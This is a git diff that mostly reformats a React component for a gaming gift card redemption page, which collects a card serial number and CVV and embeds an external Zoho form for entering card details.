@@ -1,14 +1,22 @@
-import React, { useState } from 'react';
-import { motion } from 'framer-motion';
-import { useForm, SubmitHandler } from 'react-hook-form';
-import { RedeemFormData } from '../types';
-import { redeemCard, setCurrentTiktokUsername } from '../services/api';
-import { Loader } from 'lucide-react';
+import React, { useState } from "react";
+import { motion } from "framer-motion";
+import { useForm, SubmitHandler } from "react-hook-form";
+import { RedeemFormData } from "../types";
+import { redeemCard, setCurrentTiktokUsername } from "../services/api";
+import { Loader } from "lucide-react";
 
 const RedeemSection: React.FC = () => {
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [redeemStatus, setRedeemStatus] = useState<{ success: boolean; message: string } | null>(null);
-  const { register, handleSubmit, reset, formState: { errors } } = useForm<RedeemFormData>();
+  const [redeemStatus, setRedeemStatus] = useState<{
+    success: boolean;
+    message: string;
+  } | null>(null);
+  const {
+    register,
+    handleSubmit,
+    reset,
+    formState: { errors },
+  } = useForm<RedeemFormData>();
 
   const onSubmit: SubmitHandler<RedeemFormData> = async (data) => {
     setIsSubmitting(true);
@@ -17,16 +25,16 @@ const RedeemSection: React.FC = () => {
 
     try {
       const response = await redeemCard({
-        type: 'redeem_card',
+        type: "redeem_card",
         data: {
           number: data.cardSerialNumber,
-          cvv: data.cvv
-        }
+          cvv: data.cvv,
+        },
       });
-      
+
       setRedeemStatus({
         success: response.success,
-        message: response.message
+        message: response.message,
       });
 
       if (response.success) {
@@ -35,7 +43,7 @@ const RedeemSection: React.FC = () => {
     } catch (error) {
       setRedeemStatus({
         success: false,
-        message: 'An error occurred while redeeming the card'
+        message: "An error occurred while redeeming the card",
       });
     } finally {
       setIsSubmitting(false);
@@ -68,15 +76,27 @@ const RedeemSection: React.FC = () => {
           transition={{ duration: 0.6, delay: 0.2 }}
         >
           {redeemStatus && (
-            <div className={`mb-6 p-4 rounded-lg ${
-              redeemStatus.success 
-                ? 'bg-success-700/20 text-success-500' 
-                : 'bg-error-700/20 text-error-500'
-            }`}>
+            <div
+              className={`mb-6 p-4 rounded-lg ${
+                redeemStatus.success
+                  ? "bg-success-700/20 text-success-500"
+                  : "bg-error-700/20 text-error-500"
+              }`}
+            >
               {redeemStatus.message}
             </div>
           )}
-          <iframe aria-label='Enter your card details below to redeem your gaming gift card' frameBorder="0" style={{height: '600px', width: '448px', borderRadius: '35px', padding: '20px', margin: '0px auto'}} src='https://forms.zohopublic.com/arpayhks/form/LionDubaitestform/formperma/NMUsXosjNcb_HilAO9GxScn-Aj2NqPQS4CNUPKdnSEI'></iframe>
+          <iframe
+            aria-label="Enter your card details below to redeem your gaming gift card"
+            style={{
+              height: "600px",
+              width: "448px",
+              borderRadius: "35px",
+              padding: "20px",
+              margin: "0px auto",
+            }}
+            src="https://forms.zohopublic.com/arpayhks/form/LionDubaitestform/formperma/NMUsXosjNcb_HilAO9GxScn-Aj2NqPQS4CNUPKdnSEI"
+          ></iframe>
 
           {/* <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
             <div>
